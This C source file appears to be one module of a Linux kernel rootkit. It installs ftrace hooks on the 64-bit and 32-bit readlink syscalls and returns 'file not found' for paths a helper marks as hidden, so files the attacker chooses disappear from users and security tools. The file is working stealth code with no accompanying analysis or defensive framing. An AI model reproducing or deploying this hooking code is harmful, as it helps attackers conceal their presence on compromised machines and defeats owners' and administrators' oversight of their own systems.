#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hiding_stat.h"

static asmlinkage long (*orig_readlink)(const struct pt_regs *);
static asmlinkage long (*orig_readlink32)(const struct pt_regs *);

static notrace asmlinkage long hook_readlink(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->di;

    if (should_hide_path(pathname)) {
        return -ENOENT;
    }
    return orig_readlink(regs);
}

static notrace asmlinkage long hook_readlink32(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->bx;

    if (should_hide_path(pathname)) {
        return -ENOENT;
    }
    return orig_readlink32(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_readlink", hook_readlink, &orig_readlink),
    HOOK("__ia32_sys_readlink", hook_readlink32, &orig_readlink32),
};

notrace int hiding_readlink_init(void) {
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hiding_readlink_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
